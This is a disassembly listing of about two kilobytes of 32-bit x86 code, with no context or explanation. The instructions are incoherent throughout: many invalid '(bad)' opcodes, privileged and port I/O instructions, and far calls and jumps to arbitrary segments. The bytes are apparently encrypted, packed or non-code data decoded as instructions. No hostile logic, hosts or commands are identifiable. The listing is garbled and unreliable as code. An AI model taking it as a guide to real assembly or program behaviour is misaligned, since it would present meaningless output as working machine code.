  421770:	jns    0x42179b
  421772:	rcl    ecx,cl
  421774:	and    eax,0x8dc51042
  421779:	dec    ecx
  42177a:	fwait
  42177b:	mov    al,0x7c
  42177d:	push   ebp
  42177e:	stos   DWORD PTR es:[edi],eax
  42177f:	fwait
  421780:	xchg   edi,eax
  421781:	or     eax,0xe0d2ae52
  421786:	fwait
  421787:	xor    BYTE PTR [ebx-0x4e8967b6],0xda
  42178e:	mov    dl,0x98
  421790:	jmp    0x2109b9e8
  421795:	mov    cl,0x72
  421797:	sahf   
  421798:	test   eax,0x51473ba1
  42179d:	fsubr  st,st(2)
  42179f:	clc    
  4217a0:	push   cs
  4217a1:	adc    DWORD PTR [ebp+0x4],edx
  4217a4:	test   al,0xfb
  4217a6:	ror    edx,0x17
  4217a9:	shr    BYTE PTR [ecx+eiz*8],1
  4217ac:	jae    0x421773
  4217ae:	jecxz  0x4217a0
  4217b0:	mov    dl,al
  4217b2:	std    
  4217b3:	xchg   esp,eax
  4217b4:	mov    ebp,0xf27a9e3c
  4217b9:	jne    0x4217f8
  4217bb:	in     al,dx
  4217bc:	pop    ds
  4217bd:	add    BYTE PTR [eax+0x7d],bh
  4217c0:	pop    esp
  4217c1:	pop    es
  4217c2:	ja     0x421835
  4217c4:	xor    dh,BYTE PTR [edi-0x62302a9e]
  4217ca:	mov    edi,0x15a8d7fb
  4217cf:	jge    0x4217bb
  4217d1:	call   0x37c2:0x2b497b24
  4217d8:	lock dec edx
  4217da:	(bad)  
  4217db:	not    DWORD PTR ds:0xf9e9d31d
  4217e1:	fs out 0x4e,eax
  4217e4:	test   DWORD PTR [ebp-0x4092d6df],esi
  4217ea:	jg     0x421834
  4217ec:	fimul  WORD PTR [edi-0x65]
  4217ef:	xchg   BYTE PTR [ecx-0x6abdf6dd],al
  4217f5:	shr    DWORD PTR [edi],0xab
  4217f8:	(bad)  
  4217fa:	push   edi
  4217fb:	aaa    
  4217fc:	or     cl,BYTE PTR [ebp-0x4d583a03]
  421802:	pop    ss
  421803:	cld    
  421804:	in     al,0x29
  421806:	inc    ebx
  421807:	stos   DWORD PTR es:[edi],eax
  421808:	repz xor BYTE PTR [eax-0xc],dh
  42180c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42180d:	iret   
  42180e:	jb     0x4217b0
  421810:	mov    eax,ds:0x2288c5d6
  421815:	jno    0x4217f7
  421817:	jg     0x421886
  421819:	ins    DWORD PTR es:[edi],dx
  42181a:	(bad)  [eax]
  42181c:	repnz call 0x1ff1:0x8c057b56
  421824:	sub    al,0x9e
  421826:	mov    WORD PTR [eax+ecx*1+0x36e62a68],cs
  42182d:	sub    al,0xcf
  42182f:	test   al,0xc8
  421831:	ds jno 0x421819
  421834:	sbb    eax,0xd6976df3
  421839:	shl    DWORD PTR [ebp+esi*1-0x5],0xe2
  42183e:	inc    eax
  42183f:	xor    eax,0xb1593b4d
  421844:	pop    edi
  421845:	xchg   ecx,eax
  421846:	mov    ch,BYTE PTR [eax+0x9]
  421849:	mov    cl,0x29
  42184b:	add    ah,bh
  42184d:	jmp    0xac9:0xb25e365c
  421854:	lods   eax,DWORD PTR ds:[esi]
  421855:	push   ebp
  421856:	jmp    0x421810
  421858:	shr    DWORD PTR [edx],cl
  42185a:	inc    edx
  42185b:	jp     0x421800
  42185d:	int3   
  42185e:	das    
  42185f:	ss jns 0x421812
  421862:	jmp    0xdf55:0xc8810087
  421869:	fwait
  42186a:	out    0x67,al
  42186c:	mov    ch,0x1f
  42186e:	loop   0x42186e
  421870:	(bad)  
  421872:	add    al,0x5b
  421874:	aad    0x1f
  421876:	cs cmp eax,0x10cfd425
  42187c:	cmp    esp,ecx
  42187e:	xchg   BYTE PTR [ebx],ah
  421880:	mov    al,ds:0x9843fb5e
  421885:	cmp    edx,DWORD PTR [ebp-0x45daa6d5]
  42188b:	dec    ecx
  42188c:	es fwait
  42188e:	rcr    ebp,1
  421890:	jecxz  0x421890
  421892:	cmp    al,0x6e
  421894:	xor    eax,0xe34e6138
  421899:	aaa    
  42189a:	mov    ss,WORD PTR [ebx+ebp*2-0x63]
  42189e:	and    DWORD PTR [edx-0x6a13d75c],esp
  4218a4:	or     al,0x9c
  4218a6:	bound  ecx,QWORD PTR [edi]
  4218a8:	scas   eax,DWORD PTR es:[edi]
  4218a9:	xlat   BYTE PTR ds:[ebx]
  4218aa:	or     eax,0x79698752
  4218af:	inc    edi
  4218b0:	lods   eax,DWORD PTR ds:[esi]
  4218b1:	test   BYTE PTR [edi+ebp*4],bh
  4218b4:	pusha  
  4218b5:	ins    BYTE PTR es:[edi],dx
  4218b6:	fs dec edx
  4218b8:	ins    BYTE PTR es:[edi],dx
  4218b9:	and    DWORD PTR [ebx+0x2c3934d4],0xffffffd1
  4218c0:	pop    ecx
  4218c1:	dec    eax
  4218c2:	mov    gs,WORD PTR [edx-0x2ff90f4f]
  4218c8:	jae    0x421934
  4218ca:	sub    DWORD PTR [ecx+0x430c0347],ecx
  4218d0:	jne    0x42193e
  4218d2:	data16 shr BYTE PTR [eax+0xb932c6f],1
  4218d9:	mov    ah,0xae
  4218db:	mov    ?,WORD PTR [ebx+eiz*8-0x6193b834]
  4218e2:	pop    eax
  4218e3:	xor    dh,BYTE PTR [ecx-0x581aab75]
  4218e9:	int3   
  4218ea:	mov    ah,0xc
  4218ec:	test   eax,0xed773c87
  4218f1:	loope  0x4218f0
  4218f3:	bound  esp,QWORD PTR [edx-0x77]
  4218f6:	loop   0x421925
  4218f8:	jle    0x421928
  4218fa:	loopne 0x421918
  4218fc:	pop    ss
  4218fd:	aas    
  4218fe:	jg     0x421962
  421900:	push   ds
  421901:	fsub   QWORD PTR [edx-0xd176f41]
  421907:	push   ss
  421908:	push   ebp
  421909:	leave  
  42190a:	mov    ecx,es
  42190c:	(bad)  
  42190d:	cli    
  42190e:	(bad)  
  42190f:	(bad)  
  421910:	je     0x421934
  421912:	add    al,0x77
  421914:	cmp    al,0x78
  421916:	xchg   dh,bh
  421918:	(bad)  
  42191a:	mov    bl,0x64
  42191c:	sti    
  42191d:	test   eax,0x7a0f8e9f
  421922:	test   eax,0xdd6b3321
  421927:	add    eax,0xc7cca6fd
  42192c:	push   ebx
  42192d:	and    edx,edx
  42192f:	(bad)  
  421930:	fadd   st,st(0)
  421932:	je     0x4218fa
  421934:	cmp    ch,BYTE PTR [ebx+0x3b]
  421937:	shl    DWORD PTR [esi+0xa],0x15
  42193b:	cli    
  42193c:	adc    al,0x4c
  42193e:	sbb    cl,BYTE PTR ds:0x345f9fe7
  421944:	popa   
  421945:	sbb    BYTE PTR [eax+0x78],cl
  421948:	adc    al,0x77
  42194a:	jb     0x4219bc
  42194c:	xchg   ecx,eax
  42194d:	lahf   
  42194e:	cmp    al,0x96
  421950:	(bad)  
  421951:	xlat   BYTE PTR ds:[ebx]
  421952:	mov    ch,0x73
  421954:	mov    ah,0x53
  421956:	in     eax,0xa2
  421958:	mov    dl,0xd9
  42195a:	outs   dx,BYTE PTR ds:[esi]
  42195b:	fild   WORD PTR [edi+0x4a5d5bc0]
  421961:	ds and eax,0x739811e2
  421967:	mov    ds:0x55a85696,eax
  42196c:	or     BYTE PTR [edi-0x36],al
  42196f:	std    
  421970:	mov    ds:0x71e47a77,eax
  421975:	inc    edx
  421976:	xchg   bh,ah
  421978:	data16 mov dl,0xce
  42197b:	adc    BYTE PTR [edx+0x3c],cl
  42197e:	cmc    
  42197f:	ins    BYTE PTR es:[edi],dx
  421980:	test   BYTE PTR [edi-0x48],0x4a
  421984:	push   esi
  421985:	jge    0x42193e
  421987:	mov    dl,0xe7
  421989:	loopne 0x42194c
  42198b:	sbb    al,0xe8
  42198d:	outs   dx,DWORD PTR ds:[esi]
  42198e:	inc    ecx
  42198f:	push   ss
  421990:	mov    eax,0x562f5571
  421995:	mov    eax,ds:0xc04d7f31
  42199a:	mov    BYTE PTR [eax-0x47],ah
  42199d:	dec    ebp
  42199e:	mov    dl,0xc
  4219a0:	test   al,0x3f
  4219a2:	cld    
  4219a3:	int3   
  4219a4:	popa   
  4219a5:	pop    esp
  4219a6:	fisub  WORD PTR [ecx-0x761483c4]
  4219ac:	sbb    dh,BYTE PTR [esi+0x3fc396c8]
  4219b2:	sub    bl,BYTE PTR [ecx-0x1f683c9b]
  4219b8:	cwde   
  4219b9:	retf   
  4219ba:	pop    edi
  4219bb:	add    BYTE PTR [ecx],bl
  4219bd:	xchg   edx,eax
  4219be:	mov    ah,0xf9
  4219c0:	pop    ecx
  4219c1:	lods   al,BYTE PTR ds:[esi]
  4219c2:	in     al,dx
  4219c3:	fdiv   QWORD PTR [edx-0x4c]
  4219c6:	xchg   ebp,eax
  4219c7:	pop    ds
  4219c8:	mov    ah,0xad
  4219ca:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4219cc:	jmp    0x4219db
  4219ce:	adc    DWORD PTR [edi-0xf],edi
  4219d1:	and    DWORD PTR [ebx-0x8],edx
  4219d4:	in     al,dx
  4219d5:	push   ds
  4219d6:	mov    bh,0x71
  4219d8:	xor    BYTE PTR [eax+0x6e],0xa6
  4219dc:	push   0x78173dad
  4219e1:	xchg   BYTE PTR [esi-0x76eb2dc3],bh
  4219e7:	mov    eax,0xe930b324
  4219ec:	test   DWORD PTR fs:[esp+ebx*8],esp
  4219f0:	sti    
  4219f1:	leave  
  4219f2:	jmp    0x421a5f
  4219f4:	call   0x4277:0xa3d26bd7
  4219fb:	inc    edx
  4219fc:	pop    ss
  4219fd:	(bad)  
  4219fe:	mov    ds:0x3e8e20d7,eax
  421a03:	jge    0x421a3a
  421a05:	(bad)  [ebx]
  421a07:	pop    esi
  421a08:	in     al,dx
  421a09:	mov    eax,ds:0x5ed91351
  421a0e:	pushf  
  421a0f:	sub    BYTE PTR [esi-0x78],cl
  421a12:	out    0x64,al
  421a14:	xor    eax,0x7d592d40
  421a19:	addr16 (bad) 
  421a1b:	xchg   esi,eax
  421a1c:	push   ds
  421a1d:	cmp    eax,0xc6fdecf6
  421a22:	xor    DWORD PTR [edi],esp
  421a24:	cmp    esp,edi
  421a26:	or     cl,dl
  421a28:	pop    es
  421a29:	push   eax
  421a2a:	jmp    0x421a7c
  421a2c:	push   eax
  421a2d:	call   0x89dd:0xa77eaef7
  421a34:	ret    
  421a35:	dec    edx
  421a36:	rol    BYTE PTR [eax],1
  421a38:	nop
  421a39:	jmp    0x4219dc
  421a3b:	pusha  
  421a3c:	das    
  421a3d:	lahf   
  421a3e:	inc    ebp
  421a3f:	push   edi
  421a40:	xor    ebx,ecx
  421a42:	mov    bl,0xc1
  421a44:	test   DWORD PTR [eax+ebp*1+0x628940da],esi
  421a4b:	mov    ds:0x5805ce1f,eax
  421a50:	or     edi,ebp
  421a52:	stos   DWORD PTR es:[edi],eax
  421a53:	adc    dh,BYTE PTR [eax-0x30cf2b7d]
  421a59:	loope  0x421a3f
  421a5b:	mov    ecx,0x302135d2
  421a60:	pusha  
  421a61:	and    dh,BYTE PTR [esi-0x69]
  421a64:	dec    edx
  421a65:	push   esp
  421a66:	xchg   edi,eax
  421a67:	(bad)  [ebp+0x3d4ada15]
  421a6d:	(bad)
  421a70:	fcomp  QWORD PTR [eax+0x44]
  421a73:	popf   
  421a74:	rol    BYTE PTR [edx+0x48],cl
  421a77:	sub    al,0xdc
  421a79:	cmp    eax,0xa6f7be22
  421a7e:	std    
  421a7f:	pop    eax
  421a80:	adc    eax,0xbc9733dc
  421a85:	jge    0x421a68
  421a87:	fisubr WORD PTR [edx-0x23d7de6a]
  421a8d:	mov    al,ds:0x33b0496c
  421a92:	sub    eax,0x4d37c28b
  421a97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a98:	xchg   ecx,eax
  421a99:	jmp    0x8bb2:0x561f967f
  421aa0:	jl     0x421ad7
  421aa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421aa3:	ror    BYTE PTR [ebx],cl
  421aa5:	push   eax
  421aa6:	cmp    ch,BYTE PTR [eax-0x32e2db58]
  421aac:	mov    ebx,0x2e97d307
  421ab1:	dec    ebx
  421ab2:	imul   ecx,DWORD PTR [edi-0x24],0xffffffd2
  421ab6:	sbb    BYTE PTR [esi],ah
  421ab8:	fld    TBYTE PTR [ecx-0x55cc6c92]
  421abe:	loopne 0x421a5c
  421ac0:	in     eax,dx
  421ac1:	push   ecx
  421ac2:	test   DWORD PTR gs:[edx+0x27a01e7a],esi
  421ac9:	sub    bh,bh
  421acb:	sub    BYTE PTR [ecx-0x27],0x1e
  421acf:	cmp    BYTE PTR [ecx],ch
  421ad1:	xchg   dh,al
  421ad3:	call   0x7c83:0x1f3f52d5
  421ada:	or     BYTE PTR [eax],al
  421adc:	cdq    
  421add:	cmp    BYTE PTR [ebp+ecx*4+0x7b0ea7fe],bl
  421ae4:	cmp    eax,0x5c0323c6
  421ae9:	push   ebp
  421aea:	push   eax
  421aeb:	dec    eax
  421aec:	xchg   ebp,eax
  421aed:	add    DWORD PTR [ebx+edi*1-0x54],ebp
  421af1:	sbb    eax,0x477bef3f
  421af6:	pop    ebp
  421af7:	mov    bh,0xba
  421af9:	in     al,0x6b
  421afb:	dec    edx
  421afc:	and    BYTE PTR [ebx+0x68d57a6b],cl
  421b02:	mov    al,0xf4
  421b04:	push   ss
  421b05:	xor    ch,BYTE PTR [edi+0x74]
  421b08:	icebp  
  421b09:	push   cs
  421b0a:	lods   eax,DWORD PTR ds:[esi]
  421b0b:	shr    ebp,cl
  421b0d:	jmp    0xee8a:0x457b7749
  421b14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b15:	cmp    DWORD PTR [eax+0x79],ebp
  421b18:	xchg   DWORD PTR [ebx-0x41],ebx
  421b1b:	sub    BYTE PTR [esi+ecx*4],bl
  421b1e:	mov    eax,ds:0x276e6291
  421b23:	jmp    0x421b32
  421b25:	push   esp
  421b26:	sub    esi,DWORD PTR [ecx]
  421b28:	js     0x421b47
  421b2a:	cmp    BYTE PTR [ebx+0xe],cl
  421b2d:	mov    ecx,0xa053112b
  421b32:	lock pop esp
  421b34:	into   
  421b35:	daa    
  421b36:	scas   al,BYTE PTR es:[edi]
  421b37:	mov    esi,0x28aff9df
  421b3c:	retf   
  421b3d:	idiv   ebp
  421b3f:	xor    DWORD PTR [eax-0x373838c1],ecx
  421b45:	sahf   
  421b46:	push   es
  421b47:	popf   
  421b48:	(bad)  
  421b49:	push   ss
  421b4a:	repz jg 0x421b81
  421b4d:	sbb    DWORD PTR [eax+ebp*4-0x19],ecx
  421b51:	loop   0x421b4f
  421b53:	mov    cl,0x70
  421b55:	or     esp,ecx
  421b57:	jmp    DWORD PTR [eax]
  421b59:	mov    eax,0xf3d05f69
  421b5e:	push   edx
  421b5f:	dec    eax
  421b60:	addr16 xchg edx,eax
  421b62:	add    DWORD PTR [ecx-0x32],edi
  421b65:	jns    0x421bd5
  421b67:	dec    edi
  421b68:	loopne 0x421b09
  421b6a:	add    DWORD PTR [edi-0x2c],0x9800262
  421b71:	nop
  421b72:	add    al,0x6e
  421b74:	in     eax,0xa7
  421b76:	cmp    esi,edx
  421b78:	xor    DWORD PTR [ecx],edi
  421b7a:	call   0x1cf6:0x356fc6c7
  421b81:	lea    esp,[ecx]
  421b83:	push   esp
  421b84:	inc    ebp
  421b85:	mov    al,BYTE PTR [ecx]
  421b87:	cs (bad) 
  421b8a:	sbb    DWORD PTR [edi-0x19daef0e],edi
  421b90:	cmp    ebp,eax
  421b92:	mov    ch,0x26
  421b94:	mov    esp,0x452972be
  421b99:	pop    eax
  421b9a:	pop    eax
  421b9b:	inc    eax
  421b9c:	mov    ch,0x85
  421b9e:	adc    al,0x37
  421ba0:	lock mov bh,BYTE PTR [eax+0x4f8b2f1b]
  421ba7:	mov    bh,0x1a
  421ba9:	sbb    ah,ch
  421bab:	adc    al,0xe4
  421bad:	ror    DWORD PTR [edx-0x3f],0x4b
  421bb1:	xchg   DWORD PTR [eax+0x46e9abf6],ecx
  421bb7:	sbb    DWORD PTR [ecx+0x59],edi
  421bba:	cmc    
  421bbb:	stos   BYTE PTR es:[edi],al
  421bbc:	or     al,dl
  421bbe:	mov    dh,BYTE PTR [eax]
  421bc0:	adc    DWORD PTR [ebx-0x76],0xd5d28609
  421bc7:	in     eax,dx
  421bc8:	sub    ebx,DWORD PTR [esi]
  421bca:	stos   BYTE PTR es:[edi],al
  421bcb:	int    0x49
  421bcd:	jne    0x421ba6
  421bcf:	add    eax,DWORD PTR ds:0xcdb04937
  421bd5:	daa    
  421bd6:	xor    esp,DWORD PTR [ecx+0x2ca39e91]
  421bdc:	bound  ebx,QWORD PTR [eax]
  421bde:	fstp   QWORD PTR [ebp-0x3963a47e]
  421be4:	ror    DWORD PTR [ebx+0x10],cl
  421be7:	daa    
  421be8:	loopne 0x421c67
  421bea:	xchg   ebp,eax
  421beb:	push   edi
  421bec:	jno    0x421c33
  421bee:	add    eax,0x4c2f7489
  421bf3:	xchg   bl,bl
  421bf5:	sbb    eax,0xb6b581ef
  421bfa:	mov    eax,ds:0x6934067
  421bff:	pop    ecx
  421c00:	arpl   WORD PTR ds:[ebx],bx
  421c03:	je     0x421be6
  421c05:	(bad)  
  421c07:	and    eax,0x43560000
  421c0c:	pop    edx
  421c0d:	pop    ecx
  421c0e:	pop    edi
  421c0f:	pop    ecx
  421c10:	push   edi
  421c11:	dec    edi
  421c12:	mov    fs,WORD PTR [ecx+0x88fe972]
  421c18:	pop    edi
  421c19:	nop
  421c1a:	cli    
  421c1b:	stos   BYTE PTR es:[edi],al
  421c1c:	add    DWORD PTR [eax],eax
  421c1e:	xchg   BYTE PTR [esi],al
  421c20:	add    BYTE PTR [eax],al
  421c22:	or     al,dl
  421c24:	outs   dx,BYTE PTR ds:[esi]
  421c25:	fisub  DWORD PTR [eax]
  421c27:	jno    0x421c94
  421c29:	test   al,0x1f
  421c2b:	sahf   
  421c2c:	fisub  DWORD PTR [ebx+0x15]
  421c2f:	sbb    ecx,ebp
  421c31:	dec    esi
  421c32:	shl    DWORD PTR [esi],0x6f
  421c35:	xchg   ebp,eax
  421c36:	xor    eax,0x43ec03b
  421c3b:	mov    bh,0xcd
  421c3d:	mov    esi,0x956c99fc
  421c42:	lea    esi,[edi]
  421c44:	xor    cl,BYTE PTR [edx+eiz*2+0x40]
  421c48:	iret   
  421c49:	pop    esi
  421c4a:	push   ebx
  421c4b:	xchg   edx,eax
  421c4c:	adc    eax,DWORD PTR [ecx+0x1b763ba]
  421c52:	inc    edi
  421c53:	inc    edi
  421c54:	jp     0x421c0d
  421c56:	jnp    0x421cd1
  421c58:	mov    ebp,0x9d81f131
  421c5d:	ins    BYTE PTR es:[edi],dx
  421c5e:	mov    esi,0x757553ea
  421c63:	cmp    dl,BYTE PTR [ecx+edx*2]
  421c66:	retf   
  421c67:	adc    al,0xdb
  421c69:	sub    eax,0x43478c8c
  421c6e:	inc    esi
  421c6f:	pop    edx
  421c70:	gs push edx
  421c72:	ds fmul st(4),st
  421c75:	bound  edi,QWORD PTR [ecx-0x4]
  421c78:	shr    BYTE PTR [ebx],0xba
  421c7b:	sub    edi,esi
  421c7d:	stc    
  421c7e:	or     BYTE PTR [esi],bh
  421c80:	xlat   BYTE PTR ds:[ebx]
  421c81:	mov    cl,0xd0
  421c83:	cmp    eax,0xc6c56f12
  421c88:	fst    QWORD PTR gs:[eax]
  421c8b:	xor    al,0x69
  421c8d:	fucomi st,st(3)
  421c8f:	mov    dl,0xae
  421c91:	and    esp,DWORD PTR [eax-0x46fc2488]
  421c97:	xor    eax,0xf51049c6
  421c9c:	enter  0xdcba,0x97
  421ca0:	jnp    0x421c70
  421ca2:	mov    ds:0xced8975a,eax
  421ca7:	mov    al,ds:0x45db7657
  421cac:	(bad)  
  421cad:	out    dx,eax
  421cae:	loopne 0x421c8a
  421cb0:	call   0xcc95:0xbcf63d98
  421cb7:	pop    esp
  421cb8:	sub    eax,0xcb9d8be4
  421cbd:	mov    ss,WORD PTR [ebx]
  421cbf:	dec    ebx
  421cc0:	and    BYTE PTR [esi],ch
  421cc2:	pop    esp
  421cc3:	add    dh,BYTE PTR [esi+0x268d9f17]
  421cc9:	daa    
  421cca:	sub    al,0xa5
  421ccc:	imul   esi,DWORD PTR [ebp+ebp*2-0x7a],0xf38be762
  421cd4:	or     DWORD PTR [edx-0x37e6db87],0xffffffd0
  421cdb:	mov    al,0x30
  421cdd:	lds    eax,FWORD PTR [ecx]
  421cdf:	out    dx,al
  421ce0:	icebp  
  421ce1:	sar    DWORD PTR [ecx-0x30],1
  421ce4:	sbb    ebp,esi
  421ce6:	dec    edx
  421ce7:	lea    edx,cs:0x1421d1d0
  421cee:	xchg   edi,eax
  421cef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cf0:	jnp    0x421d67
  421cf2:	call   0x77184be1
  421cf7:	addr16 cmc 
  421cf9:	and    DWORD PTR [ebp+0x36d7ec29],eax
  421cff:	lods   eax,DWORD PTR ds:[esi]
  421d00:	pop    esp
  421d01:	push   0x5
  421d03:	mov    gs,esi
  421d05:	sbb    BYTE PTR [esi-0x2b],bl
  421d08:	sbb    ebp,ebp
  421d0a:	inc    esp
  421d0b:	adc    DWORD PTR [edi],edx
  421d0d:	aaa    
  421d0e:	pop    eax
  421d0f:	and    cl,BYTE PTR [ecx]
  421d11:	xor    ch,BYTE PTR [edx-0x2df3f393]
  421d17:	mov    al,dl
  421d19:	xchg   ebx,eax
  421d1a:	push   ecx
  421d1b:	or     esp,ecx
  421d1d:	dec    esp
  421d1e:	in     al,0x1c
  421d20:	adc    cl,0x46
  421d23:	loop   0x421ce7
  421d25:	lock sbb bh,BYTE PTR [edi+0x9]
  421d29:	aad    0x96
  421d2b:	dec    ebx
  421d2c:	stc    
  421d2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d2e:	retf   0x72e4
  421d31:	icebp  
  421d32:	(bad)  
  421d33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d34:	add    BYTE PTR [edx+0x25],0x19
  421d38:	inc    ebx
  421d39:	scas   eax,DWORD PTR es:[edi]
  421d3a:	push   esi
  421d3b:	dec    ebp
  421d3c:	adc    al,0x62
  421d3e:	call   0x3f8c1cf2
  421d43:	je     0x421dbe
  421d45:	and    ebx,DWORD PTR [ebx-0x5d]
  421d48:	push   cx
  421d4a:	push   esp
  421d4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d4c:	cmp    eax,DWORD PTR [ebp+0x71]
  421d4f:	ret    0xbdd3
  421d52:	xchg   ebp,eax
  421d53:	pop    esi
  421d54:	jle    0x421d64
  421d56:	dec    edi
  421d57:	add    eax,0x5a7c6e40
  421d5c:	mov    ss,WORD PTR [esp+ebp*8+0x23bacdeb]
  421d63:	cli    
  421d64:	sub    dh,bl
  421d66:	(bad)  
  421d67:	push   eax
  421d68:	hlt    
  421d69:	jns    0x421dbc
  421d6b:	pop    esp
  421d6c:	add    dl,BYTE PTR [esi+0x686034f6]
  421d72:	push   esi
  421d73:	ds enter 0x3844,0x52
  421d78:	loopne 0x421d3c
  421d7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d7b:	or     bh,BYTE PTR [eax+edi*2+0x74]
  421d7f:	and    eax,0xf9beee42
  421d84:	adc    al,0x3b
  421d86:	scas   eax,DWORD PTR es:[edi]
  421d87:	sbb    al,0xa4
  421d89:	popa   
  421d8a:	sub    al,0x72
  421d8c:	cmc    
  421d8d:	stc    
  421d8e:	imul   ebp,DWORD PTR [ebx-0x5b9b3ef6],0xd2c46b11
  421d98:	push   eax
  421d99:	mov    ah,0xa1
  421d9b:	or     DWORD PTR [ebp-0x10],esi
  421d9e:	jg     0x421d28
  421da0:	test   BYTE PTR [ebp+eiz*1+0x705584d6],bh
  421da7:	inc    edx
  421da8:	dec    eax
  421da9:	cmp    al,0xb8
  421dab:	icebp  
  421dac:	mov    WORD PTR [ebx-0x5c5c634b],gs
  421db2:	fstp   TBYTE PTR [edi]
  421db4:	seta   BYTE PTR [ebp-0x70]
  421db8:	or     BYTE PTR [edi+0x3b357694],al
  421dbe:	sub    edx,edi
  421dc0:	mov    esp,0x4ec11868
  421dc5:	ds inc sp
  421dc8:	jbe    0x421e27
  421dca:	scas   eax,DWORD PTR es:[edi]
  421dcb:	stos   DWORD PTR es:[edi],eax
  421dcc:	pop    ds
  421dcd:	jmp    0xe600a76
  421dd2:	outs   dx,BYTE PTR ds:[esi]
  421dd3:	dec    edi
  421dd4:	cmp    esi,ebx
  421dd6:	mov    cl,0xdf
  421dd8:	outs   dx,BYTE PTR ds:[esi]
  421dd9:	add    ecx,0x1e
  421ddc:	dec    ecx
  421ddd:	daa    
  421dde:	mov    esp,0xe80275c3
  421de3:	in     al,dx
  421de4:	(bad)  
  421de5:	sub    ch,bl
  421de7:	stc    
  421de8:	(bad)  
  421de9:	idiv   DWORD PTR [ebx+0x2b1807c5]
  421def:	jmp    0x421dab
  421df1:	inc    ax
  421df3:	shr    DWORD PTR [eax],0x28
  421df6:	or     DWORD PTR [esi-0x5b],edi
  421df9:	mov    ss,edx
  421dfb:	leave  
  421dfc:	pop    ebp
  421dfd:	pusha  
  421dfe:	fwait
  421dff:	dec    ecx
  421e00:	mov    cl,0x30
  421e02:	xlat   BYTE PTR ds:[ebx]
  421e03:	iret   
  421e04:	bound  eax,QWORD PTR [edx]
  421e06:	pop    ecx
  421e07:	vmread DWORD PTR [ecx+0x4f],ebp
  421e0b:	sar    BYTE PTR [esi-0x25a3d95d],0xb5
  421e12:	jecxz  0x421dd3
  421e14:	(bad)  
  421e15:	iret   
  421e16:	mov    edx,esp
  421e18:	and    esp,edx
  421e1a:	test   BYTE PTR [eax],0xf8
  421e1d:	imul   esp,DWORD PTR [esi+0x5b],0xffffffc9
  421e21:	dec    esp
  421e22:	jnp    0x421e9a
  421e24:	mov    ah,0x96
  421e26:	cmp    al,0x78
  421e28:	dec    eax
  421e29:	sar    DWORD PTR [ebx+edi*8-0x70],1
  421e2d:	call   0xd146:0x5005012d
  421e34:	jnp    0x421e37
  421e36:	cmp    BYTE PTR [eax+0x40749f5d],bh
  421e3c:	les    esi,FWORD PTR [edx+0x5db6c0a6]
  421e42:	sbb    al,0xd
  421e44:	jl     0x421ded
  421e46:	inc    edi
  421e47:	aam    0xef
  421e49:	outs   dx,BYTE PTR ds:[esi]
  421e4a:	adc    BYTE PTR [eax-0x4b95d0a5],cl
  421e50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e52:	(bad)  
  421e53:	mov    bl,0x43
  421e55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e56:	cs int 0xd2
  421e59:	iret   
  421e5a:	mov    DWORD PTR [ebx+ecx*1+0x6d66bb0f],edi
  421e61:	js     0x421e12
  421e63:	call   0xf3ed:0xe30af3cb
  421e6a:	les    edx,FWORD PTR [edx]
  421e6c:	pop    es
  421e6d:	add    ebx,DWORD PTR [ebx+0x19]
  421e70:	lea    esi,[eax-0x68]
  421e73:	popf   
  421e74:	ss retf 
  421e76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e77:	ror    DWORD PTR [edi+0x38924936],1
  421e7d:	mov    edx,0xec1d9ed3
  421e82:	repz jbe 0x421e80
  421e85:	fnstsw WORD PTR [edi-0xac1775a]
  421e8b:	push   eax
  421e8c:	fs dec edx
  421e8e:	into   
  421e8f:	mov    DWORD PTR [ebp+0x5ed4aa21],ecx
  421e95:	and    eax,0xbedf3999
  421e9a:	icebp  
  421e9b:	js     0x421e98
  421e9d:	retf   0x97e5
  421ea0:	pop    ebx
  421ea1:	call   0x6f50:0x1ea029ef
  421ea8:	ja     0x421e4c
  421eaa:	push   cs
  421eab:	jmp    0x61a448fd
  421eb0:	arpl   WORD PTR [ecx+0x72f7770c],cx
  421eb6:	call   0x945cd77d
  421ebb:	fnstenv ds:0xa8752698
  421ec1:	inc    ebx
  421ec2:	sub    bh,cl
  421ec4:	jb     0x421e80
  421ec6:	out    0xf9,eax
  421ec8:	xor    edx,DWORD PTR [ebp-0x77]
  421ecb:	std    
  421ecc:	out    dx,al
  421ecd:	dec    esi
  421ece:	scas   eax,DWORD PTR es:[edi]
  421ecf:	(bad)  
  421ed0:	sub    eax,0x28e4a573
  421ed5:	fdivr  st(6),st
  421ed7:	xor    BYTE PTR [edx+0x72],0xdf
  421edb:	and    BYTE PTR [ecx],al
  421edd:	dec    ebx
  421ede:	jbe    0x421f5e
  421ee0:	rcr    dh,1
  421ee2:	pop    edi
  421ee3:	aas    
  421ee4:	lods   eax,DWORD PTR ds:[esi]
  421ee5:	cld    
  421ee6:	jle    0x421e80
  421ee8:	leave  
  421ee9:	cmp    ax,0x87ab
  421eed:	cmp    al,BYTE PTR [ebx]
  421eef:	inc    edi
  421ef0:	gs mov bl,0xab
  421ef3:	pop    ecx
  421ef4:	sbb    ecx,DWORD PTR [ebx-0x19b2e6b3]
  421efa:	stos   DWORD PTR es:[edi],eax
  421efb:	xor    edi,DWORD PTR [esi+0x3b]
  421efe:	jne    0x421efc
  421f00:	jnp    0x421ef9
  421f02:	dec    edi
  421f03:	cmp    DWORD PTR [ecx],ebp
  421f05:	and    al,0x80
  421f07:	mov    ah,0x23
  421f09:	push   edx
  421f0a:	adc    bh,BYTE PTR [ecx]
  421f0c:	cmc    
  421f0d:	dec    ebp
  421f0e:	or     ch,BYTE PTR [si+0x59]
  421f12:	ret    0x2bbf
  421f15:	dec    ebp
  421f16:	mov    ah,0xb1
  421f18:	jmp    0x872a:0x8e5a0f12
